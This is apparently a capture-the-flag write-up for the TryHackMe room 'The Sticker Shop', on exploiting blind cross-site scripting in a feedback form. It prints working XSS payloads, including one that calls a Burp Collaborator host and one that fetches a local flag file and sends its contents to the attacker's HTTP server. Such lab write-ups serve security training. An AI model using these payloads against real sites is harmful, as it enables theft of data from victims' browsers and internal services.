---
title: "TryHackMe: The Sticker Shop"
excerpt: "Full Writeups for tryhackme lookup room. 🤗"
toc: true
toc_sticky: true

categories:
  - TryHackMe

last_modified_at: 2024-11-30T12:53:00-05:00

---

**The Sticker Shop** is a easy room on Tryhackme . In this We have given flag location on website only we have to retrive it 

## Website Overview
The website consists of two pages - 
### Home Page
- Displays a simple interface with cat stickers etc.
- No vulnerabilities were found here.

### Submit Feedback Page
- Contains a feedback form with a textarea for users to submit their comments.
- The form sends a POST request to /submit_feedback.

### Initial Observations
The feedback form allows user-supplied input, which could be a potential injection point for attacks like Cross-Site Scripting (XSS).

The response to a normal feedback submission is: `Thanks for your feedback! It will be evaluated shortly by our staff`.

Try Normal Paylaod first :
```console
'"><script>alert(1)</script>
```
![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Website.webp){:width="1200" height="600" }

## Blind XSS Discovery
1. used Burp-collaborator to check if the Blind XSS is exsist or not
2. Payload used : 
```console
'"><script src=https://xyzh5f7ugxnj7919kl6eqcaohfn6bxzm.oastify.com></script>`
```

![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Blind%20XSS.webp){: width="1200" height="600" }
![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Collaborator.webp){: width="1200" height="600" }

3. After submitting the payload in the feedback form, I observed a DNS interaction logged in Burp Collaborator, confirming the execution of the payload.

## Exploitation
First I setup a Python server on my Kali Linux machine - `python3 -m http.server 8000`

### Crafting the Payload
To exploit the vulnerability, I crafted a JavaScript payload that:

Fetches the flag from the server’s localhost (127.0.0.1:8080/flag.txt).

I used the localhost address because they said that they host everything on the same computer that they use for browsing the internet and looking at customer feedback.

Sends the retrieved content to my HTTP server.

```console
'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.8.6.102:8000/?flag=' + encodeURIComponent(data));
    });
</script>
```
Note: Edit and Replace your own IP Address.


### Injecting the Payload
I submitted the payload in the feedback form.
Shortly after, my HTTP server captured the exfiltrated flag in the query string of an incoming GET request.
![Web 80 Index](/images/Posts/tryhackme_sticker_shop/Flag.webp){: width="1200" height="600" }

After URL Decodes it We get The flag

